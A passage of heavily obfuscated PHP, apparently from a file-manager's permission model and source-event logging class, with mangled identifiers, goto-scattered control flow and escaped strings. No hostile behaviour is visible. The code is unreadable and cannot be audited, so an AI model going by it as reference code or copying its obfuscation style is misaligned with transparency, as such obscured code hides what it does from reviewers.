$_SERVER[ÈİÅ¿ÈÈ¥×]; $DíÅÎØ·«ª = Model($eóÒÖÀ«[1167]); $b¶¬Ñ´£Ã = $DíÅÎØ·«ª->sourceInfo($EïáºÚñ™); goto dãÌÓî; dãÌÓî: if (!$b¶¬Ñ´£Ã) { return !1; } $DíÅÎØ·«ª->groupPathDisplay($b¶¬Ñ´£Ã); $e´‹½°¯“ = array($b¶¬Ñ´£Ã); goto CÑ˜÷µ„ÕÁ; eØƒ±¿»İ: } private function groupAuthInfo($c³ñ»´õÑ½, $Aì¯ò“Ôå˜) { $D²´ëñ¶†„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F–ŒçÒ¨Î¹ = Model($D²´ëñ¶†„[475])->getInfo($Aì¯ò“Ôå˜); return array($D²´ëñ¶†„[1844] => intval($c³ñ»´õÑ½[$D²´ëñ¶†„[392]]), $D²´ëñ¶†„[1828] => $c³ñ»´õÑ½, $D²´ëñ¶†„[1845] => LNG($D²´ëñ¶†„[1846]), $D²´ëñ¶†„[1837] => array($D²´ëñ¶†„[402] => $F–ŒçÒ¨Î¹[$D²´ëñ¶†„[28]], $D²´ëñ¶†„[75] => KodIO::make($F–ŒçÒ¨Î¹[$D²´ëñ¶†„[407]][$D²´ëñ¶†„[385]]), $D²´ëñ¶†„[1843] => $F–ŒçÒ¨Î¹[$D²´ëñ¶†„[480]])); } protected function groupRootAuth($a‰øˆ†Àã, $B– „íÚë‰ = false) { goto A­æÊ‰¹Ğ; A¿ç ÅˆˆĞ: $Fååà¢Óô = $eÃç¤¯Å‡ ? $this->authMake($eÃç¤¯Å‡, $B– „íÚë‰) : !1; $bªìŠŒÚ½ã = $Fååà¢Óô ? $Fååà¢Óô[$eÉÇ‘¶Âƒ[434]] : !1; $F½Š«İ‰Ş÷[$b¦öÇÇÔ] = $bªìŠŒÚ½ã ? $bªìŠŒÚ½ã : $F‚µ³ã—Ä; goto Eôõ¨ç©×; Eôõ¨ç©×: return $F½Š«İ‰Ş÷[$b¦öÇÇÔ]; goto Eãç¤Òéê; c¹Œ³˜: $Fä‰òŒ·Í­ = array($eÉÇ‘¶Âƒ[385] => $B¬ï„ŒÙÒ[$eÉÇ‘¶Âƒ[407]][$eÉÇ‘¶Âƒ[385]]); $cÎøß¸ºÛè = $eÉÇ‘¶Âƒ[1827]; $eÃç¤¯Å‡ = $this->field($cÎøß¸ºÛè)->cacheMemory()->where($Fä‰òŒ·Í­)->select(); goto A¿ç ÅˆˆĞ; DãÂÕí»…Û: static $F½Š«İ‰Ş÷ = array(); if (isset($F½Š«İ‰Ş÷[$b¦öÇÇÔ])) { return $F½Š«İ‰Ş÷[$b¦öÇÇÔ]; } $B¬ï„ŒÙÒ = Model($eÉÇ‘¶Âƒ[475])->getInfo($a‰øˆ†Àã); goto B’°ãÚö­; A­æÊ‰¹Ğ: $eÉÇ‘¶Âƒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B– „íÚë‰ = $B– „íÚë‰ ? $B– „íÚë‰ : USER_ID; $b¦öÇÇÔ = $B– „íÚë‰ . $eÉÇ‘¶Âƒ[1847] . $a‰øˆ†Àã; goto DãÂÕí»…Û; B’°ãÚö­: $cî‘—¹”™© = $this->userGroupList($B– „íÚë‰); $F‚µ³ã—Ä = isset($cî‘—¹”™©[$a‰øˆ†Àã]) ? $cî‘—¹”™©[$a‰øˆ†Àã][$eÉÇ‘¶Âƒ[392]] : !1; if ($F‚µ³ã—Ä && Model($eÉÇ‘¶Âƒ[1819])->authCheckAction($F‚µ³ã—Ä[$eÉÇ‘¶Âƒ[392]], $eÉÇ‘¶Âƒ[1670])) { $F½Š«İ‰Ş÷[$b¦öÇÇÔ] = $F‚µ³ã—Ä; return $F‚µ³ã—Ä; } goto c¹Œ³˜; Eãç¤Òéê: } public function authOwnerApply($Dš¿êˆ§çŸ) { goto C–á™ë‰–Â; C–á™ë‰–Â: $bµ˜‚„ÁÙ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($Dš¿êˆ§çŸ[$bµ˜‚„ÁÙ[392]]) || isset($Dš¿êˆ§çŸ[$bµ˜‚„ÁÙ[1848]]) && $Dš¿êˆ§çŸ[$bµ˜‚„ÁÙ[1848]]) { return $Dš¿êˆ§çŸ; } if (AuthModel::authCheckRoot($Dš¿êˆ§çŸ[$bµ˜‚„ÁÙ[392]][$bµ˜‚„ÁÙ[393]])) { return $Dš¿êˆ§çŸ; } goto D¿¹âï³Æ½; bÅ¦–›Ú½: $Dš¿êˆ§çŸ[$bµ˜‚„ÁÙ[392]][$bµ˜‚„ÁÙ[1850]] = Model($bµ˜‚„ÁÙ[491])->userListInfo($EÃÁ¸è¥Š¯); return $Dš¿êˆ§çŸ; goto F®ƒ¼ÌÌ»; bÜŸ‰¸èÂ«: $cÔïÚ„äŸñ = array($bµ˜‚„ÁÙ[399] => array($bµ˜‚„ÁÙ[400], $eˆÓÔƒÜğ)); $e•Œ—•¤àÈ = $this->field($cˆˆÚ‰†§)->where($cÔïÚ„äŸñ)->select(); $e•Œ—•¤àÈ = array_to_keyvalue_group($e•Œ—•¤àÈ, $bµ˜‚„ÁÙ[385]); goto bŠ˜á«±×ê; D¿¹âï³Æ½: $eˆÓÔƒÜğ = Model($bµ˜‚„ÁÙ[1167])->parentLevelArray($Dš¿êˆ§çŸ[$bµ˜‚„ÁÙ[476]]); $eˆÓÔƒÜğ = array_merge(array($Dš¿êˆ§çŸ[$bµ˜‚„ÁÙ[385]]), array_reverse($eˆÓÔƒÜğ)); $cˆˆÚ‰†§ = $bµ˜‚„ÁÙ[1827]; goto bÜŸ‰¸èÂ«; D…Ù¶œ¿Š: if (count($EÃÁ¸è¥Š¯) == 0) { $EÃÁ¸è¥Š¯ = $this->authFolderOwnerGroup($Dš¿êˆ§çŸ[$bµ˜‚„ÁÙ[473]]); } $EÃÁ¸è¥Š¯ = array_unique($EÃÁ¸è¥Š¯); if (AuthModel::authCheckRoot($Dš¿êˆ§çŸ[$bµ˜‚„ÁÙ[392]][$bµ˜‚„ÁÙ[393]])) { $EÃÁ¸è¥Š¯[] = USER_ID; } goto bÅ¦–›Ú½; bŠ˜á«±×ê: $d¢è¶âÕ = array(); $EÃÁ¸è¥Š¯ = array(); foreach ($e•Œ—•¤àÈ as $DÑ°®¾áê => $aë›¿©ô³˜) { $B¯Æ¾èö˜ = $this->authFolderOwnerUser($aë›¿©ô³˜); $d¢è¶âÕ[$DÑ°®¾áê] = $B¯Æ¾èö˜; $EÃÁ¸è¥Š¯ = array_merge($EÃÁ¸è¥Š¯, $B¯Æ¾èö˜[$bµ˜‚„ÁÙ[551]]); if ($B¯Æ¾èö˜[$bµ˜‚„ÁÙ[1849]]) { break; } } goto D…Ù¶œ¿Š; F®ƒ¼ÌÌ»: } private function authFolderOwnerGroup($B’œÅÇ”„‚) { $d£Ÿ¢¡Œƒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C‡Ÿ¼°ß¦ = Model($d£Ÿ¢¡Œƒ[1733])->where(array($d£Ÿ¢¡Œƒ[1650] => $B’œÅÇ”„‚))->select(); $C®ƒ•å±¬ = array(); if (!$C‡Ÿ¼°ß¦) { return $C®ƒ•å±¬; } foreach ($C‡Ÿ¼°ß¦ as $AÆ¥òŸéÖø) { $CŠ…Êò»› = $this->authInfo($AÆ¥òŸéÖø); if (AuthModel::authCheckRoot($CŠ…Êò»›[$d£Ÿ¢¡Œƒ[392]])) { $C®ƒ•å±¬[] = $AÆ¥òŸéÖø[$d£Ÿ¢¡Œƒ[1490]]; } } return $C®ƒ•å±¬; } private function authFolderOwnerUser($A†¢ĞˆÓ“) { $EÎß†²ÑºÓ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fÁ‘ùªĞ’î = array(); $b‚¯ÃÂïÃ± = !1; foreach ($A†¢ĞˆÓ“ as $e‡Óò™ÄÃ’) { $a¹®Ò›¢Ú” = $this->authInfo($e‡Óò™ÄÃ’); if ($e‡Óò™ÄÃ’[$EÎß†²ÑºÓ[473]] == $EÎß†²ÑºÓ[485]) { $b‚¯ÃÂïÃ± = !0; } if ($e‡Óò™ÄÃ’[$EÎß†²ÑºÓ[387]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($a¹®Ò›¢Ú”[$EÎß†²ÑºÓ[392]])) { $fÁ‘ùªĞ’î[] = $e‡Óò™ÄÃ’[$EÎß†²ÑºÓ[473]]; } } } return array($EÎß†²ÑºÓ[551] => $fÁ‘ùªĞ’î, $EÎß†²ÑºÓ[1849] => $b‚¯ÃÂïÃ±); } public function authMake($FÁµ¦ñÃ, $fØÓ—ïä† = false) { $eÙÅÂ©Š¥© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fø¢¶…„Ğ = $this->authArrayCheck($FÁµ¦ñÃ, $fØÓ—ïä†); if ($fø¢¶…„Ğ[$eÙÅÂ©Š¥©[1851]]) { $fø¢¶…„Ğ[$eÙÅÂ©Š¥©[1851]] = $this->sourceAuthInfo($fø¢¶…„Ğ[$eÙÅÂ©Š¥©[1851]]); } return $fø¢¶…„Ğ; } public function authArrayCheck($C‚Óßº¼ÜÎ, $A»š²‚ª = false) { goto a‘ùä„ìÇù; B˜¨®Ø½ï: foreach ($C‚Óßº¼ÜÎ as $Cøƒõ¿«…¡) { $bœ»¯«ËŠ³ = $this->authInfo($Cøƒõ¿«…¡); if (!$bœ»¯«ËŠ³) { continue; } $b½©¼®æ¯È = $Cøƒõ¿«…¡[$E¬ÓÒ‘½‹[473]]; $d¿‘‹Ï„­¢ = intval($bœ»¯«ËŠ³[$E¬ÓÒ‘½‹[392]]); if ($Cøƒõ¿«…¡[$E¬ÓÒ‘½‹[387]] == SourceModel::TYPE_USER && $b½©¼®æ¯È == $A»š²‚ª) { $B·³ÂÃù†ß = !0; $cíËö…µ“¼ = $bœ»¯«ËŠ³; $e…Õ‡½õ = $d¿‘‹Ï„­¢; } else { if ($Cøƒõ¿«…¡[$E¬ÓÒ‘½‹[387]] == SourceModel::TYPE_GROUP && $this->groupContainUser($b½©¼®æ¯È, $A»š²‚ª)) { $CÉ‚Ñßé› = !0; $aÓÁ²Òß¡á = $this->groupStepToUserGroup($b½©¼®æ¯È, $A»š²‚ª); if ($aÓÁ²Òß¡á < $aãÔ«³˜¨´) { $aãÔ«³˜¨´ = $aÓÁ²Òß¡á; $eÌ‘ÕÈ†·ß = $d¿‘‹Ï„­¢; $E…‡ÉİÇ“ = $bœ»¯«ËŠ³; $F”ñ·‰ŠÂ = $b½©¼®æ¯È; } if ($aÓÁ²Òß¡á == $aãÔ«³˜¨´ && $d¿‘‹Ï„­¢ >= $eÌ‘ÕÈ†·ß) { $eÌ‘ÕÈ†·ß = $d¿‘‹Ï„­¢; $E…‡ÉİÇ“ = $bœ»¯«ËŠ³; $F”ñ·‰ŠÂ = $b½©¼®æ¯È; } } else { if ($b½©¼®æ¯È == $E¬ÓÒ‘½‹[485]) { $A‡ÆÅ’Ì¨‹ = !0; $c¼Ëñ¨’Ãá = $bœ»¯«ËŠ³; $b“˜‰‚ê‚Ì = $d¿‘‹Ï„­¢; } } } } if ($B·³ÂÃù†ß) { $c¬‰øÒ‰‹Ã = $e…Õ‡½õ; $bœ»¯«ËŠ³ = $cíËö…µ“¼; $Açç˜í™õ = LNG($E¬ÓÒ‘½‹[1852]); } else { if ($CÉ‚Ñßé›) { $c¬‰øÒ‰‹Ã = $eÌ‘ÕÈ†·ß; $bœ»¯«ËŠ³ = $E…‡ÉİÇ“; $eÀÆÁ‚¤¿’ = Model($E¬ÓÒ‘½‹[475])->getInfo($F”ñ·‰ŠÂ); $Açç˜í™õ = $E¬ÓÒ‘½‹[157] . $eÀÆÁ‚¤¿’[$E¬ÓÒ‘½‹[480]] . $E¬ÓÒ‘½‹[1853] . LNG($E¬ÓÒ‘½‹[1854]); } else { if ($A‡ÆÅ’Ì¨‹) { $c¬‰øÒ‰‹Ã = $b“˜‰‚ê‚Ì; $bœ»¯«ËŠ³ = $c¼Ëñ¨’Ãá; $Açç˜í™õ = LNG($E¬ÓÒ‘½‹[1824]); } else { $c¬‰øÒ‰‹Ã = 0; $bœ»¯«ËŠ³ = !1; $Açç˜í™õ = $E¬ÓÒ‘½‹[33]; } } } $b‹Ò“Î÷Ò = array($E¬ÓÒ‘½‹[1844] => intval($c¬‰øÒ‰‹Ã), $E¬ÓÒ‘½‹[1828] => $bœ»¯«ËŠ³, $E¬ÓÒ‘½‹[1845] => $Açç˜í™õ, $E¬ÓÒ‘½‹[1837] => $Cøƒõ¿«…¡[$E¬ÓÒ‘½‹[385]]); goto d¯œğ—Æê—; cïóÆª’ğ: $aãÔ«³˜¨´ = 1000; $F”ñ·‰ŠÂ = 0; $A‡ÆÅ’Ì¨‹ = 0; goto a‰ÀøÏƒ×‚; Aâ¥œßÉÙ: $B·³ÂÃù†ß = 0; $e…Õ‡½õ = 0; $cíËö…µ“¼ = 0; goto dï„¨‘Ñ‘ğ; d¯œğ—Æê—: return $b‹Ò“Î÷Ò; goto cŠò§Ä¡à˜; a‘ùä„ìÇù: $E¬ÓÒ‘½‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$C‚Óßº¼ÜÎ) { return array($E¬ÓÒ‘½‹[393] => 0, $E¬ÓÒ‘½‹[434] => !1); } $A»š²‚ª = $A»š²‚ª ? $A»š²‚ª : USER_ID; goto Aâ¥œßÉÙ; a‰ÀøÏƒ×‚: $b“˜‰‚ê‚Ì = 0; $c¼Ëñ¨’Ãá = 0; $Cøƒõ¿«…¡ = array($E¬ÓÒ‘½‹[385] => 0); goto B˜¨®Ø½ï; dï„¨‘Ñ‘ğ: $CÉ‚Ñßé› = 0; $eÌ‘ÕÈ†·ß = 0; $E…‡ÉİÇ“ = 0; goto cïóÆª’ğ; cŠò§Ä¡à˜: } private function groupContainUser($cáÆŞŒÕÖ³, $c÷Ÿ†¨“Õ¼ = false) { return in_array($cáÆŞŒÕÖ³, $this->userGroupParents($c÷Ÿ†¨“Õ¼)); } private function groupStepToUserGroup($AÕö—ñ£Š‡, $C²ÛåÑö´ = false) { goto F¢Ü…õÚğ¼; bĞí²×­è—: return $bÚ¢Û¬„·¦; goto C§×ÃÓÌÑ¥; F¢Ü…õÚğ¼: $aÖŞÚÜÚÅƒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÖ‰µòòˆç = $this->userGroupList($C²ÛåÑö´); $bÚ¢Û¬„·¦ = 1000; goto aä‘Õˆ´õ‚; aä‘Õˆ´õ‚: $a‘—“©œà‚ = $GLOBALS[$aÖŞÚÜÚÅƒ[6]][$aÖŞÚÜÚÅƒ[84]][$aÖŞÚÜÚÅƒ[1745]] == 1; $FÒ½£ˆÏìİ = $a‘—“©œà‚ ? 3 : 2; foreach ($dÖ‰µòòˆç as $aö–™¦£×) { if ($aö–™¦£×[$aÖŞÚÜÚÅƒ[1650]] == $AÕö—ñ£Š‡) { return 0; } $AíœĞÖÈÛÄ = explode($aÖŞÚÜÚÅƒ[47], trim($aö–™¦£×[$aÖŞÚÜÚÅƒ[476]], $aÖŞÚÜÚÅƒ[47])); if ($AíœĞÖÈÛÄ[0] == $aÖŞÚÜÚÅƒ[485] && count($AíœĞÖÈÛÄ) > $FÒ½£ˆÏìİ) { $AŠÏ¥ÂªÑ = array_reverse(array_slice($AíœĞÖÈÛÄ, $FÒ½£ˆÏìİ)); $C½‹çŠ ¬ = array_search($AÕö—ñ£Š‡, $AŠÏ¥ÂªÑ); if ($C½‹çŠ ¬ !== !1 && $C½‹çŠ ¬ + 1 <= $bÚ¢Û¬„·¦) { $bÚ¢Û¬„·¦ = $C½‹çŠ ¬ + 1; } } } goto bĞí²×­è—; C§×ÃÓÌÑ¥: } private function userGroupList($A³æ™Ùßˆ’ = false) { $fÚÛ§ÖÚ”¡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $C¢ÙË·ì­ = array(); if (isset($C¢ÙË·ì­[$A³æ™Ùßˆ’])) { return $C¢ÙË·ì­[$A³æ™Ùßˆ’]; } $fŸÄÁ…… = Model($fÚÛ§ÖÚ”¡[494])->getInfo($A³æ™Ùßˆ’); $C¢ÙË·ì­[$A³æ™Ùßˆ’] = array_to_keyvalue($fŸÄÁ……[$fÚÛ§ÖÚ”¡[1825]], $fÚÛ§ÖÚ”¡[1650]); return $C¢ÙË·ì­[$A³æ™Ùßˆ’]; } public function userGroupParents($fÈÓ‘¸‰Œö) { goto B ÕâƒöÂ˜; Cë©¨Šá: if (isset($b²¥ÂÀ¡ĞØ[$fÈÓ‘¸‰Œö])) { return $b²¥ÂÀ¡ĞØ[$fÈÓ‘¸‰Œö]; } $eñ÷Åæ«»­ = $this->userGroupList($fÈÓ‘¸‰Œö); $A­éìè¹ˆ = array(); goto a¯„ç‚İÍ…; a¯„ç‚İÍ…: $C§œã = $GLOBALS[$D˜¹‚ÊèÕê[6]][$D˜¹‚ÊèÕê[84]][$D˜¹‚ÊèÕê[1745]] == 1; $Aˆ±î¬…ß = $C§œã ? 3 : 2; foreach ($eñ÷Åæ«»­ as $BØœ‘Ò¿•™) { $D´„Ú’öƒ = array($BØœ‘Ò¿•™[$D˜¹‚ÊèÕê[1650]]); $BßÊ…ì… ¶ = explode($D˜¹‚ÊèÕê[47], trim($BØœ‘Ò¿•™[$D˜¹‚ÊèÕê[476]], $D˜¹‚ÊèÕê[47])); if ($BßÊ…ì… ¶[0] == $D˜¹‚ÊèÕê[485] && count($BßÊ…ì… ¶) > $Aˆ±î¬…ß) { $D½¯Ã³Ÿ‚ = array_slice($BßÊ…ì… ¶, $Aˆ±î¬…ß); $D´„Ú’öƒ = array_merge($D´„Ú’öƒ, array_reverse($D½¯Ã³Ÿ‚)); } $A­éìè¹ˆ = array_merge($A­éìè¹ˆ, $D´„Ú’öƒ); } goto f…“µ†…÷ª; B ÕâƒöÂ˜: $D˜¹‚ÊèÕê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $b²¥ÂÀ¡ĞØ = array(); $fÈÓ‘¸‰Œö = $fÈÓ‘¸‰Œö ? $fÈÓ‘¸‰Œö : USER_ID; goto Cë©¨Šá; f…“µ†…÷ª: $b²¥ÂÀ¡ĞØ[$fÈÓ‘¸‰Œö] = array_unique($A­éìè¹ˆ); return $b²¥ÂÀ¡ĞØ[$fÈÓ‘¸‰Œö]; goto f”µøÍÂ£Ä; f”µøÍÂ£Ä: } public function authTargetInfoMake($fåìÜŒ ƒ¿) { goto d™ÂÈÁ‚İ…; d™ÂÈÁ‚İ…: $cï§¡Ùè” =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d›¸ƒ¶‰À¨ = array(); $aÏˆº¶÷ÃÕ = array(); goto FäÏ†õê·; FäÏ†õê·: foreach ($fåìÜŒ ƒ¿ as $e„¤Š…ñ‘Ø) { if ($e„¤Š…ñ‘Ø[$cï§¡Ùè”[387]] == SourceModel::TYPE_USER) { $d›¸ƒ¶‰À¨[] = intval($e„¤Š…ñ‘Ø[$cï§¡Ùè”[473]]); } else { if ($e„¤Š…ñ‘Ø[$cï§¡Ùè”[387]] == SourceModel::TYPE_GROUP) { $aÏˆº¶÷ÃÕ[] = intval($e„¤Š…ñ‘Ø[$cï§¡Ùè”[473]]); } } } if ($d›¸ƒ¶‰À¨) { $d›¸ƒ¶‰À¨ = Model($cï§¡Ùè”[491])->userListInfo($d›¸ƒ¶‰À¨); } if ($aÏˆº¶÷ÃÕ) { $b­ƒ²ƒî¶ù = array($cï§¡Ùè”[1731] => array($cï§¡Ùè”[400], $aÏˆº¶÷ÃÕ)); $aÏˆº¶÷ÃÕ = Model($cï§¡Ùè”[475])->field($cï§¡Ùè”[1744])->where($b­ƒ²ƒî¶ù)->select(); $aÏˆº¶÷ÃÕ = array_to_keyvalue($aÏˆº¶÷ÃÕ, $cï§¡Ùè”[1650]); } goto CÅ›Ì¦ï‘; CÅ›Ì¦ï‘: return array($cï§¡Ùè”[1855] => $d›¸ƒ¶‰À¨, $cï§¡Ùè”[1856] => $aÏˆº¶÷ÃÕ); goto e¾ò‚­Ùˆ÷; e¾ò‚­Ùˆ÷: } public function authInfo($C¢šáŒ©‡) { $c§®áµ”ˆ‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($C¢šáŒ©‡[$c§®áµ”ˆ‚[1799]]) { $f…Û´ê™áË = Model($c§®áµ”ˆ‚[1819])->listData($C¢šáŒ©‡[$c§®áµ”ˆ‚[1799]]); if (!$f…Û´ê™áË) { return !1; $DŸ‰ù¡Î›… = Model($c§®áµ”ˆ‚[1819])->listData(); $Dğ§Ğ À½ = array_filter_by_field($DŸ‰ù¡Î›…, $c§®áµ”ˆ‚[392], $c§®áµ”ˆ‚[485]); return $Dğ§Ğ À½; } $D‡²ğŸ­Ñ = array_field_key($f…Û´ê™áË, array($c§®áµ”ˆ‚[383], $c§®áµ”ˆ‚[28], $c§®áµ”ˆ‚[392], $c§®áµ”ˆ‚[1671], $c§®áµ”ˆ‚[1673])); $D‡²ğŸ­Ñ[$c§®áµ”ˆ‚[1857]] = $C¢šáŒ©‡; return $D‡²ğŸ­Ñ; } else { return array($c§®áµ”ˆ‚[401] => 0, $c§®áµ”ˆ‚[1656] => $C¢šáŒ©‡[$c§®áµ”ˆ‚[1800]], $c§®áµ”ˆ‚[402] => $c§®áµ”ˆ‚[33], $c§®áµ”ˆ‚[1671] => $c§®áµ”ˆ‚[1858]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\162\x63\x65\x5f\x65\166\x65\156\164"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\124\151\x6d\x65", "\x74\151\155\145", "\x69\x6e\163\x65\162\x74", "\x66\x75\156\x63\x74\151\x6f\x6e"), array("\x64\145\x73\143", '', "\151\x6e\163\x65\162\x74\x2c\165\160\x64\141\164\x65\54\163\x65\154\145\143\x74", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($fÃ¼‡†÷Ò, $aî‚Ÿ¿åŞ, $fé„¦¶èß° = '') { goto C…²ºôÊÔ; C…²ºôÊÔ: $BîœœÔ„İ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->eventSave) { return; } $d¥¾‚²ºù = Model($BîœœÔ„İ[1167])->sourceInfo($fÃ¼‡†÷Ò); goto E¯ŞŒ©Ò‚â; fçš²±çãª: $fÅÄ”à†º = array($BîœœÔ„İ[399] => $fÃ¼‡†÷Ò, $BîœœÔ„İ[1859] => $d¥¾‚²ºù[$BîœœÔ„İ[478]], $BîœœÔ„İ[1860] => $d¥¾‚²ºù[$BîœœÔ„İ[28]], $BîœœÔ„İ[483] => $d¥¾‚²ºù[$BîœœÔ„İ[483]], $BîœœÔ„İ[1482] => USER_ID, $BîœœÔ„İ[404] => $aî‚Ÿ¿åŞ, $BîœœÔ„İ[1484] => $fé„¦¶èß°); $this->addSystemLog($aî‚Ÿ¿åŞ, $fÅÄ”à†º); return $this->add($fÅÄ”à†º); goto d¡¶òƒÖÓ; E¯ŞŒ©Ò‚â: if (!$d¥¾‚²ºù) { return !1; } if ($this->isCacheEvent($d¥¾‚²ºù, $aî‚Ÿ¿åŞ)) { return; } if ($fé„¦¶èß° && is_string($fé„¦¶èß°)) { $fé„¦¶èß° = array($BîœœÔ„İ[1684] => $fé„¦¶èß°); } goto fçš²±çãª; d¡¶òƒÖÓ: } private function addSystemLog($aØ§æÑğ¡», $Bà†‰£±ãÛ) { $F’éÀµ‚Œõ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($aØ§æÑğ¡» == $F’éÀµ‚Œõ[1861]) { $aØ§æÑğ¡» = $Bà†‰£±ãÛ[$F’éÀµ‚Œõ[421]][$F’éÀµ‚Œõ[1862]]; } else { if (in_array($aØ§æÑğ¡», array($F’éÀµ‚Œõ[1627], $F’éÀµ‚Œõ[1863]))) { $aØ§æÑğ¡» = $Bà†‰£±ãÛ[$F’éÀµ‚Œõ[421]][$F’éÀµ‚Œõ[700]]; } } $Açšàñ«Ã‹ = array_merge($Bà†‰£±ãÛ, array($F’éÀµ‚Œõ[1864] => $Bà†‰£±ãÛ[$F’éÀµ‚Œõ[385]], $F’éÀµ‚Œõ[1865] => $Bà†‰£±ãÛ[$F’éÀµ‚Œõ[1865]])); Model($F’éÀµ‚Œõ[1590])->addLog($F’éÀµ‚Œõ[1866] . $aØ§æÑğ¡», $Açšàñ«Ã‹); } private function isCacheEvent($BğèÑ‘áÇµ, $EĞÂŸ‚”«˜) { if ($BğèÑ‘áÇµ[$_SERVER[ÈİÅ¿ÈÈ¥×][387]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($B”êÜ‚Ä©ï, $e£«½â‘öì) { $CºŒ×¬×ÈÇ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c¤ÏÓšÛä— = Model($CºŒ×¬×ÈÇ[1167])->sourceInfo($B”êÜ‚Ä©ï); $f–ó¼¸ÁÍù = array($CºŒ×¬×ÈÇ[1862] => $e£«½â‘öì, $CºŒ×¬×ÈÇ[28] => $c¤ÏÓšÛä—[$CºŒ×¬×ÈÇ[28]]); return $this->addEvent($B”êÜ‚Ä©ï, $CºŒ×¬×ÈÇ[1861], $f–ó¼¸ÁÍù); } public function eventFileEdit($BÌ®Äº‡½ª) { $b³Ôäù×¶å =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $då’„ŒÎŞÙ = array($b³Ôäù×¶å[1867] => $_SERVER[$b³Ôäù×¶å[1868]], $b³Ôäù×¶å[1869] => strtolower(ACTION)); return $this->addEvent($BÌ®Äº‡½ª, $b³Ôäù×¶å[1617], $då’„ŒÎŞÙ); } public function eventRecycle($EÄò í³×ö, $bËˆ·š…°³) { return $this->addEvent($EÄò í³×ö, $_SERVER[ÈİÅ¿ÈÈ¥×][1863], $bËˆ·š…°³); } public function eventRemove($C–‰ÕãòªÑ) { $FÂÔôïÊ˜Œ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÆ‹éÓ¬ä¾ = Model($FÂÔôïÊ˜Œ[1167])->sourceInfo($C–‰ÕãòªÑ); $f¨ŒŒÛ…¡¹ = $BÆ‹éÓ¬ä¾[$FÂÔôïÊ˜Œ[28]]; return $this->addEvent($BÆ‹éÓ¬ä¾[$FÂÔôïÊ˜Œ[478]], $FÂÔôïÊ˜Œ[1616], $f¨ŒŒÛ…¡¹); } public function eventShare($Dˆ‹ˆ½ãôË, $FäËëõããÔ) { return $this->addEvent($Dˆ‹ˆ½ãôË, $_SERVER[ÈİÅ¿ÈÈ¥×][1627], $FäËëõããÔ); } public function eventMove($d¯£õ†ÉÈ¾, $e“È¦Œæ­º, $C©ìÏ ã„Ö) { goto CÂö¬µ„Šù; c¤³”¼Œ«è: $E“ùãóêƒ• = $bÄ´Æİ©¾‚->sourceInfo($e“È¦Œæ­º); $B­‘·‰‰Å = $bÄ´Æİ©¾‚->sourceInfo($C©ìÏ ã„Ö); $d´ÏÌºÊÔğ = array($eŠÃ¶÷¯ìˆ[1019] => $e“È¦Œæ­º, $eŠÃ¶÷¯ìˆ[1870] => $E“ùãóêƒ•[$eŠÃ¶÷¯ìˆ[28]], $eŠÃ¶÷¯ìˆ[1851] => $E“ùãóêƒ•[$eŠÃ¶÷¯ìˆ[483]], $eŠÃ¶÷¯ìˆ[1020] => $C©ìÏ ã„Ö, $eŠÃ¶÷¯ìˆ[1871] => $B­‘·‰‰Å[$eŠÃ¶÷¯ìˆ[28]], $eŠÃ¶÷¯ìˆ[1872] => $B­‘·‰‰Å[$eŠÃ¶÷¯ìˆ[483]]); goto fõøŒÀˆ±; fõøŒÀˆ±: $this->addEvent($d¯£õ†ÉÈ¾, $eŠÃ¶÷¯ìˆ[509], $d´ÏÌºÊÔğ); $f§”µÕ²›ò = $bÄ´Æİ©¾‚->sourceInfo($d¯£õ†ÉÈ¾); $d´ÏÌºÊÔğ = array($eŠÃ¶÷¯ìˆ[385] => $f§”µÕ²›ò[$eŠÃ¶÷¯ìˆ[385]], $eŠÃ¶÷¯ìˆ[28] => $f§”µÕ²›ò[$eŠÃ¶÷¯ìˆ[28]]); goto F­‰ù„’Çø; F­‰ù„’Çø: $this->addEvent($e“È¦Œæ­º, $eŠÃ¶÷¯ìˆ[1873], $d´ÏÌºÊÔğ); goto E•Ö¼Ó¡ÌŸ; CÂö¬µ„Šù: $eŠÃ¶÷¯ìˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bÄ´Æİ©¾‚ = Model($eŠÃ¶÷¯ìˆ[1167]); $f§”µÕ²›ò = $bÄ´Æİ©¾‚->sourceInfo($d¯£õ†ÉÈ¾); goto c¤³”¼Œ«è; E•Ö¼Ó¡ÌŸ: } public function eventCopy($F»õ–õ¼Ê) { $this->eventCreate($F»õ–õ¼Ê, $_SERVER[ÈİÅ¿ÈÈ¥×][507]); } public function eventRename($c ÄÀæ”ß, $D†ÕÎ²†, $Fé¤±Ÿ°ã«) { $b·‘œêÅï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eø¦Šö®× = array($b·‘œêÅï[1019] => $D†ÕÎ²†, $b·‘œêÅï[1020] => $Fé¤±Ÿ°ã«); return $this->addEvent($c ÄÀæ”ß, $b·‘œêÅï[1180], $Eø¦Šö®×); } public function eventAddComment($f›Û¼•æœì, $aÔ·îàªŞğ) { return $this->addEvent($f›Û¼•æœì, $_SERVER[ÈİÅ¿ÈÈ¥×][1874], $aÔ·îàªŞğ); } public function eventAddDesc($E’—•é†¢, $cÌõ“†øùª) { return $this->addEvent($E’—•é†¢, $_SERVER[ÈİÅ¿ÈÈ¥×][1875], $cÌõ“†øùª); } public function 